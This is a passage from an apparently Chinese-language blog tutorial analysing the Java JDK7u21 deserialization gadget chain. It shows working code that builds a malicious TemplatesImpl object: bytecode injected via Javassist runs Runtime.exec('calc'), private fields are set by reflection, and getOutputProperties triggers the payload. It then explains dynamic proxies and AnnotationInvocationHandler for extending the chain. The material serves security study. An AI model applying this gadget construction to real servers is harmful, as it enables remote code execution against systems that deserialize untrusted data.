            final byte[] classBytes = clazz.toBytecode();
            // 4. 添加byte数组classBytes至_bytecodes字段，再添加一个另外准备的Foo类的字节（目前来看是多余的）
            // 满足条件3：TemplatesImpl类的 `_bytecodes` 变量 != null
            Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                    classBytes,
                    ClassFiles.classAsBytes(Foo.class)});
            // 5. 满足条件1：TemplatesImpl类的 `_name` 变量 != null
            Reflections.setFieldValue(templates, "_name", "Pwnr");
            // 6. 满足条件4：使TemplatesImpl类的_tfactory是一个拥有getExternalExtensionsMap()方法的类
            Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
            // 没有设置_class，满足条件2：TemplatesImpl类的`_class`变量 == null
            return templates;
        }
瞅一眼`StubTransletPayload`类的继承。
    //很优秀的按照要求继承了AbstractTranslet类
    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
            private static final long serialVersionUID = -5971610431559700674L;
    //以下看似是多余的，实际上是继承AbstractTranslet的必要，不然会报错。
    //transform(DOM document, SerializationHandler[] handlers) 需要实现 AbstractTranslet 的一个虚拟类
            public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    //下面这个函数 需要实现AbstractTranslet类对应的Translet接口的一个接口
            @Override
            public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
        }
再瞅一眼往templates类的私有字段_bytecodes， _name ， _tfactory
这些属性中塞数据的`Reflections.setFieldValue`方法。这里是通过 **反射机制** 修改私有属性。
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);//获取了对应的字段后，进行赋值。
        }
    //Reflections#getField
        public static Field getField(final Class clazz, final String fieldName) throws Exception {
            Field field = clazz.getDeclaredField(fieldName);//通过反射机制获取该字段
            if (field != null)
                field.setAccessible(true);//接触private限制
            else if (clazz.getSuperclass() != null)
                //判断父类，如果有父类，就获取父类的值，TemplatesImpl类没有父类，这里没用上。
                field = getField(clazz.getSuperclass(), fieldName);
            return field;
        }
可以看到上面的Gadgets类完美符合了我们之前在利用过程中提到的全部需要条件。但是Gadgets构造的恶意TemplatesImpl类比起我们需要的POC条件多1处东西：
  1. _bytecodes多加了一个Foo.class类
我始终没有找到这个到底有啥用，去掉后实验，没有任何影响。如果有老哥知道，可以联系我，非常感谢。
### payload位置static与构造函数
自己构造一波payload，再分析一个payload放置位置的问题
    public class jdk7u21_mine {
        //从lala这个类中提取我们命令执行的字节码
        public static class lala{
        }
        //步骤一 TemplatesImpl类
        public static void main(String[] args) throws Exception {
            ClassPool pool = ClassPool.getDefault();
            CtClass cc = pool.get(lala.class.getName());
            String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
            //之前说的静态方法和构造方法均可，这边试一下构造方法
            //cc.makeClassInitializer().insertBefore(cmd);
            //这样可以直接添加构造函数
            CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);
            cons.setBody("{"+cmd+"}");
            cc.addConstructor(cons);
            //设置不重复的类名
            String randomClassName = "LaLa"+System.nanoTime();
            cc.setName(randomClassName);
            //设置满足条件的父类
            cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
            //获取字节码
            byte[] lalaByteCodes = cc.toBytecode();
            byte[][] targetByteCodes = new byte[][]{lalaByteCodes};
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            Reflections.setFieldValue(templates,"_bytecodes",targetByteCodes);
            Reflections.setFieldValue(templates,"_name","lala"+System.nanoTime());
            Reflections.setFieldValue(templates,"_class",null);
            Reflections.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
            templates.getOutputProperties();
            //一样可以触发
    //        templates.newTransformer();
        }
>
> 以上需要注意一个情况，我们的恶意字节码类lala类，使用了static修饰符。其实我们payload写在构造函数中是可以不使用static修饰符不会影响。
>
> 但是如果我们想把payload写在static初始化块中，类就需要使用static修饰符时。不然最后实例化是不会成功的。
>
>
> 就相当于是以下的情况，内部类是不允许存在static修饰符的，原理可以[参考](https://blog.csdn.net/u010454030/article/details/80548732)。
>
>
> 
>
> ps.突然发现非static方法块也是可以写payload.....但是不纠结这个了！！
至此我们完成了恶意Templates类构造以及`TemplatesImpl.getOutputProperties`触发点的分析（当然从上面的调用过程，我们知道直接调用`TemplatesImpl.newTransformer()`也是一样的，getOutputProperties其实就是调用了newTransformer()，在接下来的延长链中其实漏洞触发是在newTransformer）。
目前的结论已经可以移花接木到fastjson的利用链中形成一套完成利用链。以及其他很多组件的利用链的最后一步都是TemplatesImpl类（限于jdk1.7版本，1.8会编译错误，原因未知）。
但是就单独作为一条利用链来说，只有exp触发点和一点点长度的利用链是不够的，我们需要继续延伸到一个反序列化readObject点，使服务端一触发反序列化，就可以沿着利用链到exp触发点。
## 延长利用链——AnnotationInvocationHandler
AnnotationInvocationHandler这是一个熟悉的类，在commons-collections一文的1.7最基础的利用链中，我们正是使用了AnnotationInvocationHandler的readobject函数作为反序列化入口点。
然而这里跟AnnotationInvocationHandler的invoke函数有关。在这之前我们需要先了解java的动态代理性质。
### 动态代理
动态代理是java的特性之一，其实就可以理解为web应用中的拦截器，在执行正式代码之前先过一个拦截器函数（比如spring的AOP）。但是以上类比只是为了便于理解，实际上spring的AOP之类的拦截器反而是基于java的动态代理实现的。
下面将举例动态代理SubjectImpl类，即在SubjectImple类前面建立一个拦截器。
`DynamicProxy.java`
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Method;
    import java.lang.reflect.Proxy;
    // 需要实现的接口（拦截动作是基于接口的，所以需要设定接口）
    interface ISubject {
        public void hello(String str);
    }
    // 实际的需要被代理的对象
    class SubjectImpl implements ISubject {
        public void hello(String str) {
            System.out.println("SubjectImpl.hello(): " + str);
        }
    }
    // Handler对象（继承InvocationHandler的拦截器）
    //InvocationHandler是一个用于跟Proxy类对接的接口
    class Handler implements InvocationHandler {
        private Object subject;
        //构造函数，传入被代理实现类的实例
        public Handler(Object subject) {
            this.subject = subject;
        }
    //所有被Proxy拦截的函数都会经过这个接口的invoke函数
        public Object invoke(Object object, Method method, Object[] args) throws Throwable {
            System.out.println("before!");
            //完成拦截操作之后去调用被代理实现类，反射机制，传入实例，参数
            method.invoke(this.subject, args);
            System.out.println("after!");
            return null;
        }
    }
    public class DynamicProxy {
        public static void main(String[] args) {
            //被代理类
            SubjectImpl subject = new SubjectImpl();
            //拦截器实现类，通过构造函数传入被代理类的实例
            InvocationHandler tempHandler = new Handler(subject);
    // 使用Proxy.newProxyInstance创建代理
            ISubject iSubject = (ISubject) Proxy.newProxyInstance(DynamicProxy.class.getClassLoader(), new Class[] {ISubject.class}, tempHandler);
            iSubject.hello("world!");
        }
    }
`Proxy.newProxyInstance`三个传入参数：
  * loader，选用的类加载器。感觉随便选就好了。
  * interfaces，被代理类所实现的接口，这个接口可以是多个。（即需要拦截的接口）
  * h，一个 实现拦截器的invocation handler。
之后只要我们调用了返回之后的对象中被安排了代理的接口，就会进入invocationHandler的invoke函数。
以上执行结果就是：
    before!
    SubjectImpl.hello(): world!
    after!
那么动态代理大概就分为几个部分：
  1. 被代理的接口类
  2. 被代理的接口类的实现类
  3. 继承InvocationHandler接口、实现invoke方法的拦截器类
  4. Proxy.newProxyInstance完成拦截器，与被代理的接口类的绑定
  5. 调用这个返回对象的被代理接口即可。（此处注意这个返回的对象不是只有被代理的接口类中的接口，还有一些常用接口，之后会截图说明。）
我们说了那么多动态代理机制，是为啥呢？
    class AnnotationInvocationHandler implements InvocationHandler, Serializable {
        //实现了InvocationHandler接口的invoke函数
        public Object invoke(Object var1, Method var2, Object[] var3) {
            ...
        }
    }
其实就是因为AnnotationInvocationHandler类其实是一个InvocationHandler接口的实现类。它不只是在cc的利用链中作为反序列化点，还是作为动态代理的拦截器实现函数(有一个自己的invoke方法)
### 动态代理链接AnnotationInvocationHandler与Templates
我们的目的是连接代理后的对象Proxy的equal方法到Templates的newTransformer方法。
当建立动态代理后（Proxy.newInstance返回一个对象a），我们假设调用a.b(c)
先瞅一眼AnnotationInvocationHandler的构造函数有个底，我们可以知道有可控的this.type与this.memberValues
    AnnotationInvocationHandler(Class var1, Map var2) {
            this.type = var1;
            this.memberValues = var2;
        }
> bytheway，这里的AnnotationInvocationHandler构造函数是缺省修饰符，它在不同的包中是不能直接调用的。
>
> 反射机制中有说到，可以使用setAccessible(true)来开放权限。
调用a.b(c)。 `sun.reflect.annotation.AnnotationInvocationHandler#invoke`